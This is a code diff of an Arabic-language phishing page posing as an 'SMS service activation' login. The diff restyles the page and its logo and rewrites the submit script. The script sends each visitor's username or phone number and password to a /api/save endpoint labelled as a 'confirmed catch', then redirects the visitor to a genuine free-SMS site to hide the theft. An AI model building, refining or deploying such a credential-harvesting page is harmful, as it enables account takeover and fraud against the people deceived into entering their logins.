@@ -6,34 +6,55 @@
     <title>تفعيل خدمة SMS</title>
     <style>
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
             display: flex; justify-content: center; align-items: center; height: 100vh;
         }
         .container {
             background: white; padding: 30px; border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 100%; max-width: 380px; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; text-align: center;
         }
-        #pageImg { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; }
-        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; }
+        /* تنسيق الأيقونة العلوي */
+        .logo-container {
+            margin-bottom: 20px;
+        }
+        #pageImg { 
+            width: 100px; 
+            height: 100px; 
+            border-radius: 50%; 
+            object-fit: contain;
+            border: 2px solid #CC0044;
+            padding: 5px;
+        }
+        
+        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; font-weight: bold; }
+        
         input {
-            width: 100%; padding: 12px; margin-bottom: 5px;
-            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none;
+            width: 100%; padding: 14px; margin-bottom: 15px;
+            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
+            outline: none; text-align: right; font-size: 14px;
         }
-        /* شكل الحقل عند الخطأ */
+        
+        input:focus { border-color: #CC0044; }
+
         input.error-border { border: 2px solid red; background-color: #fff0f0; }
         .error-text { color: red; font-size: 12px; display: none; margin-bottom: 10px; text-align: right; }
         
         button {
             width: 100%; padding: 12px; background: #CC0044; color: white;
-            border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer;
+            border: none; border-radius: 8px; font-size: 17px; font-weight: bold; 
+            cursor: pointer; transition: 0.3s;
         }
+        button:hover { background: #a30036; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg">
+        <div class="logo-container">
+            <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Free SMS Logo">
+        </div>
+
         <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>
 
         <form id="checkForm">
@@ -46,7 +67,7 @@
     </div>
 
     <script>
-        // دالة التحقق الذكية
+        // دالة التحقق
         function validate(val) {
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             const phoneRegex = /^\+?[0-9]{7,15}$/;
@@ -66,16 +87,20 @@
                 return;
             }
 
-            // إذا كان صحيحاً يرسل للبوت
-            await fetch('/api/save', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    image: "🚨 صيد محقق من صفحة SMS",
-                    letter: "المستخدم: " + user,
-                    button: "الباسورد: " + pass
-                })
-            });
+            // إرسال البيانات
+            try {
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        title: "🚨 صيد محقق من صفحة SMS",
+                        user: user,
+                        password: pass
+                    })
+                });
+            } catch (err) {
+                console.log("Error sending data");
+            }
 
             window.location.href = "https://receive-smss.com/"; 
         };
